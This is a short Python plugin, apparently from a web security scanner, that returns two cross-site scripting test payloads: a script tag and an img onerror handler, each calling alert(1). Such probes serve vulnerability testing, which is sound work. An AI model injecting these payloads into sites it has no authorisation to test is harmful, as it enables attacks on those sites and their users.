from core.payload_plugins.base import PayloadPlugin


class HTMLPayloads(PayloadPlugin):
    name = "html_payloads"
    context = "html"

    def get_payloads(self):
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
        ]